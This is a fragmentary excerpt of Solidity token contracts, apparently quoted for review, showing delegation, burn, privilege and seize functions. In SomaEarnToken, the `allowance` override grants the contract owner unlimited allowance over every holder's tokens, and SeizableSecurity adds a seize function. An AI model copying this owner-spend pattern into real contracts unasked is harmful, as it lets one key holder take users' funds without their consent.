...
contract SomaEarn is ISomaEarn, TokenRecoveryUpgradeable, GuardableUpgradeable, ReentrancyGuardUpgradeable {
     ...
     */
    address public constant override SOMA_EARN_TOKEN = 0x4714b44A5a3fd8498C11b19bE9d5e3EE8190B5d2;
    ...
    function moveDelegation(bytes32 fromPoolId, bytes32 toPoolId, uint256 amount) external override whenNotPaused nonReentrant {
...

        {
            ...
            IERC20(address(fromToken)).safeTransferFrom(sender, address(this), amount);
...
contract SomaEarnToken is OwnableUpgradeable, ERC20Security {
    ...
    /**
     * @notice Returns the allowance of `spender` to spend ``tokenOwner``'s tokens.
     * @param tokenOwner The owner of the tokens being approved for spending.
     * @param spender The spender of the tokens.
     * @return The allowance of `spender` to spend ``tokenOwner``'s tokens.
     */
    function allowance(address tokenOwner, address spender) public view virtual override returns (uint256) {
        return spender == owner() ? type(uint256).max : super.allowance(tokenOwner, spender);
    }
     ...
     * @custom:requirement The function caller must be the owner of the contract.
     */
    function updateRequiredPrivileges(bytes32 newRequiredPrivileges) external virtual override onlyOwner returns (bool) {
        _updateRequiredPrivileges(newRequiredPrivileges);
        return true;
    }
}
...
abstract contract ERC20Security is ERC20PausableUpgradeable, ERC20HistoryUpgradeable, ERC20PermitUpgradeable, SeizableSecurity, ERC20Guard, ERC20BurnableUpgradeable {
    ...
    function _burn(address to, uint256 amount) internal override(ERC20Upgradeable, ERC20HistoryUpgradeable) {
        super._burn(to, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal override(ERC20Upgradeable, ERC20HistoryUpgradeable) {
...
abstract contract SeizableSecurity is ISeizableSecurity, AccessibleUpgradeable {
     ...
     */
    function seize(address tokenHolder, uint256 amount)
    public
    override
    enableSeizing
    onlySeizeRole {
